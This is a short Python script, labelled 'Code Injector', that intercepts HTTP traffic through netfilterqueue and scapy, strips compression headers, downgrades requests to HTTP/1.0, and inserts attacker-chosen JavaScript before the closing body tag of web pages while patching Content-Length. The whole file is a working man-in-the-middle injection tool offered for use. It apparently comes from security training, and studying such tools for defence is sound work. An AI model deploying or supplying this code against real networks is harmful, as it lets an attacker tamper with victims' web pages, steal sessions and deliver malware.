#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re
import optparse
import queue
queue = queue.Queue()


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-j", "--js-code", dest="code", help="Javascript Code")
    parser.add_option("-i", "--interface", dest="interface", help="Arp Interface")
    (options, arguments) = parser.parse_args()

    if not options.code:
        parser.error("[-] Please specify Javascript Code , use --help for more.")
    if not options.interface:
        parser.error("[-] Please specify interface , use --help for more.")
    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1" , "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = options.code
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
            # print(scapy_packet.show())

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
            # print(new_packet.show())

    packet.accept()


options = get_arguments()
print("Code Injector\n\t-Alrocks29")

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packets)
    queue.run()

except KeyboardInterrupt:
    print ("\n[-] Quitting.................")
